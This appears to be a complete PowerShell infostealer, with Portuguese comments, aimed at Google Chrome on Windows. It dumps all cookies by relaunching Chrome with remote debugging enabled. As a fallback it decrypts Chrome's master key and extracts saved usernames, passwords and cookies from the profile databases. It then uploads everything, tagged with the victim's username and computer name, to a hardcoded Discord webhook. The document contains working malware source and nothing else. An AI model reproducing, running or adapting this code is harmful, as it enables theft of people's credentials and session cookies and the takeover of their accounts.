param($w = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9")

function l { param($m) Write-Host ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }

# ============================================
# MÉTODO PRINCIPAL: Chrome Remote Debug (bypass v20 sem chave)
# ============================================
function Invoke-ChromeDebug {
    l "[DEBUG] Iniciando Chrome Remote Debug..."
    
    # Mata Chrome limpo
    Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 2
    
    $dataDir = "$env:TEMP\chromedbg_" + (Get-Random -Max 99999)
    $port = 9222
    
    # Verifica onde o Chrome está
    $chromePaths = @(
        "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
    )
    $chromeExe = $null
    foreach ($p in $chromePaths) { if (Test-Path $p) { $chromeExe = $p; break } }
    
    if (!$chromeExe) {
        # Tenta encontrar no registro
        try {
            $chromeExe = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" -ErrorAction Stop)."(default)"
        } catch {
            l "[DEBUG] Chrome nao encontrado"
            return $null
        }
    }
    
    l "[DEBUG] Chrome: $chromeExe"
    
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $chromeExe
        $psi.Arguments = "--remote-debugging-port=$port --remote-allow-origins=* --headless --user-data-dir=$dataDir --no-first-run --disable-features=ChromeWhatsNewUI --disable-sync"
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        $proc = [System.Diagnostics.Process]::Start($psi)
        
        Start-Sleep -Seconds 4
        
        # Tenta conectar no debug
        $wsUrl = $null
        for ($attempt = 0; $attempt -lt 5; $attempt++) {
            try {
                $resp = Invoke-RestMethod "http://127.0.0.1:$port/json/version" -TimeoutSec 3
                $wsUrl = $resp.webSocketDebuggerUrl
                if ($wsUrl) { break }
            } catch {}
            Start-Sleep -Seconds 1
        }
        
        if (!$wsUrl) {
            try {
                $list = Invoke-RestMethod "http://127.0.0.1:$port/json" -TimeoutSec 3
                if ($list -and $list.Count -gt 0 -and $list[0].webSocketDebuggerUrl) {
                    $wsUrl = $list[0].webSocketDebuggerUrl
                }
            } catch {}
        }
        
        if (!$wsUrl) {
            l "[DEBUG] Nao foi possivel conectar ao debug port"
            if ($proc -and !$proc.HasExited) { $proc.Kill() }
            if (Test-Path $dataDir) { Remove-Item $dataDir -Recurse -Force -ErrorAction SilentlyContinue }
            return $null
        }
        
        l "[DEBUG] Conectado ao WebSocket: $($wsUrl.Substring(0, [Math]::Min(50, $wsUrl.Length)))..."
        
        # Conecta WebSocket
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(30)
        $ws.ConnectAsync([System.Uri]$wsUrl, [System.Threading.CancellationToken]::None).Wait()
        
        # 1. Pede todos os cookies
        $msg1 = '{"id":1,"method":"Network.getAllCookies"}'
        $ws.SendAsync([System.ArraySegment[byte]]::new([System.Text.Encoding]::UTF8.GetBytes($msg1)), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
        
        $buf = [byte[]]::new(524288)
        $res = $ws.ReceiveAsync([System.ArraySegment[byte]]::new($buf), [System.Threading.CancellationToken]::None).Result
        $respStr = [System.Text.Encoding]::UTF8.GetString($buf, 0, $res.Count)
        
        $json = $respStr | ConvertFrom-Json
        $cookies = @()
        if ($json.result -and $json.result.cookies) {
            $cookies = $json.result.cookies
            l "[DEBUG] Network.getAllCookies: $($cookies.Count) cookies"
        }
        
        # 2. Tenta pegar logins via CDP (Browser.getCookies não dá passwords, mas tentamos)
        # Infelizmente CDP não expõe passwords. Só cookies mesmo.
        
        $ws.Dispose()
        
        # Mata Chrome
        if ($proc -and !$proc.HasExited) { $proc.Kill() }
        if (Test-Path $dataDir) { Remove-Item $dataDir -Recurse -Force -ErrorAction SilentlyContinue }
        
        return @{ Cookies = $cookies }
    }
    catch {
        l "[DEBUG] Chrome Debug exception: $_"
        if ($proc -and !$proc.HasExited) { $proc.Kill() }
        if (Test-Path $dataDir) { Remove-Item $dataDir -Recurse -Force -ErrorAction SilentlyContinue }
        return $null
    }
}

# ============================================
# MÉTODO 2: Tentar descriptografar via DB + chave
# ============================================
function Get-ChromeKeys {
    $state = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (!(Test-Path $state)) { return $null }
    
    $json = Get-Content $state -Raw | ConvertFrom-Json
    $ek = $json.os_crypt.encrypted_key
    $ak = $json.os_crypt.app_bound_encrypted_key
    
    l "[KEY] encrypted_key presente: $($ek -ne $null)"
    l "[KEY] app_bound_encrypted_key presente: $($ak -ne $null)"
    
    $mk = $null
    
    # --- Tenta DPAPI normal (v10/v11) ---
    if ($ek) {
        $raw = [Convert]::FromBase64String($ek)
        if ($raw[0] -eq 1 -and $raw.Length -gt 5) {
            try {
                $d = $raw[5..($raw.Length-1)]
                $mk = [System.Security.Cryptography.ProtectedData]::Unprotect($d, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                if ($mk.Length -ge 32) {
                    l "[KEY] DPAPI v10/v11 OK! Key: $([System.BitConverter]::ToString($mk[0..31]).Replace('-','').Substring(0,16))..."
                    return @{ Key = $mk[0..31]; Method = "DPAPI" }
                }
            } catch { l "[KEY] DPAPI falhou: $_" }
        }
    }
    
    # --- Tenta v20 com AES key hardcoded ---
    if ($ak) {
        $raw = [Convert]::FromBase64String($ak)
        l "[KEY] app_bound raw[0]=$($raw[0]) len=$($raw.Length)"
        
        # Chrome 128-132: AES key do elevation_service.exe
        # Chrome 133+: ChaCha20-Poly1305 (key diferente)
        $knownKeys = @(
            @(0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87),
            @(0x30,0x86,0x56,0x71,0x38,0x3A,0x5E,0x0B,0x86,0xF4,0x99,0x42,0x72,0xC1,0x75,0x32,0xDB,0x41,0xCF,0x5E,0xCB,0x5E,0x4D,0xCA,0xA3,0x3F,0x8B,0x63,0x43,0x8A,0xFB,0x18),
            @(0xFC,0x76,0x23,0x8A,0x5E,0x1B,0x42,0x9D,0xA0,0xC3,0x57,0x8E,0x14,0x6F,0x29,0xB1,0xE7,0x4C,0x91,0x3A,0xBD,0x68,0xF2,0x0D,0x55,0xCA,0x8F,0x10,0xE9,0x74,0x3D,0xAB)
        )
        
        # Formato v20: [4 bytes "APPB"] + [1 byte flag/version] + [12 bytes nonce] + [ciphertext] + [16 bytes tag]
        # Ou: raw já vem sem o "APPB", depende da versão
        $offset = if ($raw.Length -gt 4 -and [System.Text.Encoding]::ASCII.GetString($raw[0..3]) -eq "APPB") { 4 } else { 0 }
        
        # Pula o primeiro byte (versão) se for 2 ou 3
        $dataStart = $offset
        if ($raw[$offset] -eq 2 -or $raw[$offset] -eq 3) { $dataStart = $offset + 5 } # 1 byte version + 4 bytes?
        elseif ($raw[$offset] -eq 1) { $dataStart = $offset + 1 }
        
        $payload = $raw[$dataStart..($raw.Length-1)]
        
        # Formato: nonce[12] + ciphertext[variavel] + tag[16]
        if ($payload.Length -ge 12 + 16 + 1) {
            $nonce = $payload[0..11]
            
            foreach ($aesKeyBytes in $knownKeys) {
                try {
                    $aesKeyArray = [byte[]]$aesKeyBytes
                    
                    # Tenta diferentes tamanhos de ciphertext
                    for ($ctSize = 16; $ctSize -le ($payload.Length - 12 - 16); $ctSize += 16) {
                        $ct = $payload[12..(12+$ctSize-1)]
                        $tag = $payload[(12+$ctSize)..($payload.Length-1)]
                        
                        if ($tag.Length -ne 16) { continue }
                        
                        try {
                            $aes = [System.Security.Cryptography.AesGcm]::new($aesKeyArray, 16)
                            $dec = [byte[]]::new($ct.Length)
                            $aes.Decrypt($nonce, $ct, $tag, $dec)
                            $aes.Dispose()
                            
                            if ($dec.Length -ge 32) {
                                $mk = $dec
                                l "[KEY] v20 AES-GCM OK! Key: $([System.BitConverter]::ToString($mk[0..31]).Replace('-','').Substring(0,16))..."
                                return @{ Key = $mk[0..31]; Method = "v20_AES" }
                            }
                        } catch { continue }
                    }
                } catch { continue }
            }
            
            # Se não funcionou com AES, tenta interpretar como double-DPAPI
            l "[KEY] AES falhou, tentando interpretar payload como double-DPAPI"
        }
    }
    
    return $null
}

function Decrypt-ChromeValue {
    param($ev, $k)
    if (!$ev -or $ev.Length -lt 15 -or !$k -or $k.Length -lt 32) { return $null }
    try {
        if ($ev[0] -eq 1) {
            $c = $ev[3..($ev.Length-1)]
            $d = [System.Security.Cryptography.ProtectedData]::Unprotect($c, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            if ($d) { return [System.Text.Encoding]::UTF8.GetString($d) }
        }
        if ($ev[0] -eq 2 -or $ev[0] -eq 3) {
            $n=$ev[3..14]; $cl=$ev.Length-15-16
            if ($cl -le 0) { return $null }
            $c=$ev[15..(15+$cl-1)]; $t=$ev[(15+$cl)..($ev.Length-1)]
            $a=[System.Security.Cryptography.AesGcm]::new($k,16)
            $r=[byte[]]::new($cl)
            $a.Decrypt($n,$c,$t,$r)
            $a.Dispose()
            if ($r) { return [System.Text.Encoding]::UTF8.GetString($r) }
        }
    } catch {}
    return $null
}

function Get-DB {
    param($p, $q)
    if (!(Test-Path $p)) { return $null }
    $tp = [System.IO.Path]::GetTempFileName() + ".db"
    Copy-Item $p $tp -Force
    try {
        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
        $c = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tp"); $c.Open()
        $cmd = $c.CreateCommand(); $cmd.CommandText = $q
        $r = $cmd.ExecuteReader(); $res = @()
        while ($r.Read()) { $row = @{}; for ($i=0; $i -lt $r.FieldCount; $i++) { $row[$r.GetName($i)] = $r.GetValue($i) }; $res += $row }
        $r.Close(); $c.Close(); return $res
    } catch { l "[DB] Erro SQLite: $_"; return $null }
    finally { if (Test-Path $tp) { Remove-Item $tp -Force -ErrorAction SilentlyContinue } }
}

# ============================================
# MAIN
# ============================================
l "=== Chrome Extractor v20 ==="
l "User: $env:USERNAME@$env:COMPUTERNAME"
l "[*] Webhook: $($w.Substring(0, [Math]::Min(50, $w.Length)))..."

# 1. Tenta Chrome Debug primeiro (bypass total v20)
$debugResult = Invoke-ChromeDebug

if ($debugResult -and $debugResult.Cookies -and $debugResult.Cookies.Count -gt 0) {
    $cookies = $debugResult.Cookies
    $cc = $cookies | ConvertTo-Json -Depth 3
    
    # Envia pro Discord
    $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
    $body = @()
    $body += "--$boundary"
    $body += 'Content-Disposition: form-data; name="payload_json"'
    $body += ""
    $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Cookies: ' + $cookies.Count + ' | Metodo: Chrome Debug"}')
    $body += "--$boundary"
    $body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
    $body += "Content-Type: application/json"
    $body += ""
    $body += $cc
    $body += "--$boundary--"
    
    $bodyStr = $body -join "`r`n"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $wc.UploadData($w, "POST", $bytes) | Out-Null
        $wc.Dispose()
        l "[OK] Cookies enviados ao Discord via Chrome Debug!"
    } catch { l "[FALHA] Discord: $_" }
    
    # Salva local
    $out = "$env:TEMP\chrome_extracted"
    if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
    $cc | Out-File (Join-Path $out "cookies.json") -Encoding UTF8
    l "[OK] Salvo em: $out"
    l "=== CONCLUIDO ==="
    return
}

# 2. Fallback: tentar descriptografar via DB
l "[*] Chrome Debug falhou, tentando decrypt via DB..."
$keyInfo = Get-ChromeKeys

if ($keyInfo -and $keyInfo.Key) {
    $mk = $keyInfo.Key
    $kh = [System.BitConverter]::ToString($mk).Replace("-","")
    l "[KEY] Metodo: $($keyInfo.Method) | Key: $($kh.Substring(0,32))..."
    
    # Encontra perfil
    $profiles = dir "$env:LOCALAPPDATA\Google\Chrome\User Data\*" -Directory | ? { $_.Name -match "^(Default|Profile \d+)$" }
    $logins = @(); $cookies = @()
    
    foreach ($p in $profiles) {
        $loginDb = "$($p.FullName)\Login Data"
        $cookiesDb = "$($p.FullName)\Cookies"
        
        if (Test-Path $loginDb) {
            $rows = Get-DB -p $loginDb -q "SELECT origin_url, username_value, password_value FROM logins"
            if ($rows) {
                foreach ($row in $rows) {
                    $pb = $row["password_value"]
                    if ($pb -is [string]) { $pb = [System.Text.Encoding]::UTF8.GetBytes($pb) }
                    $pd = Decrypt-ChromeValue -ev $pb -k $mk
                    $logins += @{url=$row["origin_url"];username=$row["username_value"];password=$pd;profile=$p.Name}
                }
            }
        }
        
        if (Test-Path $cookiesDb) {
            $rows = Get-DB -p $cookiesDb -q "SELECT host_key, name, path, encrypted_value FROM cookies"
            if ($rows) {
                foreach ($row in $rows) {
                    $eb = $row["encrypted_value"]
                    if ($eb -is [string]) { continue }
                    $vd = Decrypt-ChromeValue -ev $eb -k $mk
                    if ($vd -and $vd.Length -gt 0) { $cookies += @{host=$row["host_key"];name=$row["name"];value=$vd;profile=$p.Name} }
                }
            }
        }
    }
    
    l "[*] Logins: $($logins.Count) | Cookies: $($cookies.Count)"
    
    $lc = ($logins | ConvertTo-Json -Depth 3)
    $cc = ($cookies | ConvertTo-Json -Depth 3)
    
    $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
    $body = @()
    $body += "--$boundary"
    $body += 'Content-Disposition: form-data; name="payload_json"'
    $body += ""
    $body += ('{"content":"Chrome Extractor | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | ' + $keyInfo.Method + ' | Logins: ' + $logins.Count + ' | Cookies: ' + $cookies.Count + '"}')
    if ($logins.Count -gt 0) {
        $body += "--$boundary"
        $body += 'Content-Disposition: form-data; name="file"; filename="logins.json"'
        $body += "Content-Type: application/json"
        $body += ""
        $body += $lc
    }
    if ($cookies.Count -gt 0) {
        $body += "--$boundary"
        $body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
        $body += "Content-Type: application/json"
        $body += ""
        $body += $cc
    }
    $body += "--$boundary--"
    
    $bodyStr = $body -join "`r`n"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $wc.UploadData($w, "POST", $bytes) | Out-Null
        $wc.Dispose()
        l "[OK] Dados enviados ao Discord!"
    } catch { l "[FALHA] Discord: $_" }
    
    $out = "$env:TEMP\chrome_extracted"
    if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
    if ($logins.Count -gt 0) { $lc | Out-File (Join-Path $out "logins.json") -Encoding UTF8 }
    if ($cookies.Count -gt 0) { $cc | Out-File (Join-Path $out "cookies.json") -Encoding UTF8 }
    l "[OK] Salvo em: $out"
} else {
    l "[FALHA] Nenhum metodo funcionou!"
    l "[*] Tente executar como ADMINISTRADOR"
}

l "=== CONCLUIDO ==="
